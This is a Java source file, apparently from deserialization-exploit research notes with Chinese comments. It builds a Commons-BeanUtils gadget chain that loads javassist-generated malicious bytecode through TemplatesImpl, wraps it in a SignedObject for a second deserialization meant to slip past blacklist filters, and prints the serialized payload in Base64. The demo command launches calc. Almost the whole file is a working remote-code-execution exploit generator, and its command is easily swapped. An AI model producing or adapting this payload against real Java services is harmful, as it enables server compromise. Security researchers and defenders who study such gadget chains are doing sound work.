package CB;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.security.*;
import java.util.Base64;
import java.util.PriorityQueue;
import java.security.SignedObject;

public class CB_withoutCC_twice_deserialization {

    public static void setFieldValue(Object obj, String field, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field declaredField = obj.getClass().getDeclaredField(field);
        declaredField.setAccessible(true);
        declaredField.set(obj, value);
    }

    public static PriorityQueue<Object>  getpayload(Object object, String string) throws NoSuchFieldException, IllegalAccessException {
        //我们只需要反射将对应的comparator写入属性中，就不需要依赖CC库了
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue priorityQueue = new PriorityQueue(2, beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("2");
        setFieldValue(beanComparator, "property", string);
        setFieldValue(priorityQueue, "queue", new Object[]{object, null});
        return priorityQueue;
    }

    public static void main(String[] args) throws IOException, CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, NoSuchAlgorithmException, SignatureException, InvalidKeyException {
        //生成恶意的字节码
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("evilexp");
        ctClass.makeClassInitializer().insertBefore(cmd);
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        byte[] bytes = ctClass.toBytecode();

        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{ bytes });
        setFieldValue(obj, "_name", "RoboTerh");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        PriorityQueue queue1 = getpayload(obj, "outputProperties");

        //DSA算法使用私钥对java对象queue1进行数字签名，生成一个SignedObject对象
        //注：数字签名可以用于验证数据的完整性和身份验证。在这个例子中，数字签名可以用于验证 queue1 对象的来源和完整性，以确保它没有被篡改或伪造。
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject(queue1, kp.getPrivate(), Signature.getInstance("DSA"));

        PriorityQueue queue2 = getpayload(signedObject, "object");

        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(queue2);
        oos.close();
        System.out.println(new String(Base64.getEncoder().encode(baor.toByteArray())));

        //反序列化
        ByteArrayInputStream bais = new ByteArrayInputStream(baor.toByteArray());
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object o = ois.readObject();
        baor.close();
    }


}
